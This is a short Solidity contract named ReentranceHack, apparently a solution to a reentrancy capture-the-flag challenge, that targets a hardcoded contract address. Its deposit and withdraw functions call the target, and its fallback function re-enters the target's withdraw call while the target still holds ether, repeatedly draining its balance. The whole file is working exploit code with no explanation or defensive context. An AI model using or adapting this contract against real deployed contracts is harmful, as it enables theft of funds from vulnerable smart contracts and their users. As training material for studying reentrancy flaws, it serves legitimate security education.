//SPDX-Licence-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentranceHack {
    address reentrance = 0xd9145CCE52D386f254917e481eB44e9943F39138;

    function deposit() public payable {
        reentrance.call{value: msg.value}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
    }

    function withdraw(uint256 value) public payable {
        reentrance.call(abi.encodeWithSignature("withdraw(uint256)", value));
    }

    fallback() external payable {
        if (reentrance.balance >= msg.value) {
            reentrance.call(
                abi.encodeWithSignature("withdraw(uint256)", msg.value)
            );
        }
    }
}
